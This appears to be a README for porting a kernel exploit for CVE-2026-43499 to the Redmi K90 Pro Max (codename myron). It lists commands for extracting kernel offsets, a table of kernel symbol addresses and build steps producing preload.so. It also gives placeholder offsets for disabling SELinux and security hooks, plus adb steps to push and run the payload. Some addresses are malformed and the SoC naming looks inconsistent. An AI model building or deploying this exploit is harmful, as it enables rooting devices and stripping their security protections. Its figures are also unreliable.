# CVE-2026-43499 Exploit - Redmi K90 PM (myron) Port

## Device Information

| Property | Value |
|----------|-------|
| Device Name | Redmi K90 Pro Max (Redmi K90 PM) |
| Codename | myron |
| SoC | Qualcomm SM8850 (Snapdragon 8 Gen 3) |
| Android Version | 15 |
| MIUI Version | 16.0.x |

## Kernel Offsets Extracted

All offsets were extracted from Redmi K90 PM's vmlinux kernel using:

```bash
pahole -s task_struct vmlinux > task_offsets.txt
pahole -s cred vmlinux > cred_offsets.txt
pahole -s rt_mutex_waiter vmlinux > waiter_offsets.txt
pahole -s file_operations vmlinux > fops_offsets.txt
pahole -s pipe_buf_operations vmlinux > pipe_ops_offsets.txt
aarch64-linux-gnu-nm vmlinux | grep -E "init_task|root_task_group|..." > symbols.txt
```

### Key Symbol Offsets

| Symbol | Address | Offset |
|--------|---------|--------|
| init_task | ffffffc0823fcf00 | 0x023fcf00 |
| root_task_group | ffffffc08262e580 | 0x0262e580 |
| anon_pipe_buf_ops | ffffffc08121ee08 | 0x0121ee08 |
| kmalloc_caches | ffffffc08183c4c0 | 0x0183c4c0 |
| copy_splice_read | ffffffc08048ed90 | 0x0048ed90 |
| noop_llseek | ffffffc08043c3d4 | 0x0043c3d4 |
| configfs_read_iter | ffffffc00512c00 | 0x00512c00 |
| configfs_bin_write_iter | ffffffc00512e34 | 0x00512e34 |

## Build Instructions

```bash
cd IonStack/CVE-2026-43499/exploit

# Export NDK path if needed
export ANDROID_NDK_HOME=/path/to/ndk-r29

# Build for myron
make PROJECT=myron-MIUI.16.0 API=35

# Successful build will produce:
# build/myron-MIUI.16.0/bin/preload.so
```

## Important Notes

### Placeholders

The following offsets are placeholders and need verification:

- `SELINUX_ENFORCING_OFF`: SELinux enforcing flag location
- `SECURITY_HOOK_HEADS_OFF`: Security hook heads array
- `SLIDE_NFULNL_LOGGER_OFF`: nfulnl logger for slide attack
- `SLIDE_SYSCTL_BOOTID_OFF`: sysctl boot ID for slide attack

These should be manually verified using Ghidra/IDA or similar binary analysis tools against the actual Redmi K90 PM kernel.

### Rust Implementation

The Redmi K90 PM uses a Rust-based ashmem implementation unlike the Google Pixel variants. The ashmem-related offsets may not directly correspond to the C implementation in other devices.

## Verification Steps

1. **Check kernel version compatibility**:
   ```bash
   adb shell cat /proc/version
   adb shell getprop ro.build.version.release
   adb shell getprop ro.miui.ui.version.name
   ```

2. **Verify CVE-2026-43499 vulnerability presence**:
   - Confirm kernel has IonStack vulnerable code
   - Check for unfixed rt_mutex waiter issues

3. **Test on device**:
   ```bash
   adb push build/myron-MIUI.16.0/bin/preload.so /data/local/tmp/
   adb shell chmod +x /data/local/tmp/preload.so
   # Run exploit...
   ```

## References

- **GitHub**: https://github.com/bin-bash-dev/CyberMeowfia
- **Branch**: `feature/myron-k90pm-port`
- **Exploit Path**: `IonStack/CVE-2026-43499/exploit/src/targets/myron-MIUI.16.0/target.h`
- **CVE**: CVE-2026-43499
- **Target Device**: Redmi K90 Pro Max (myron) / SM8850
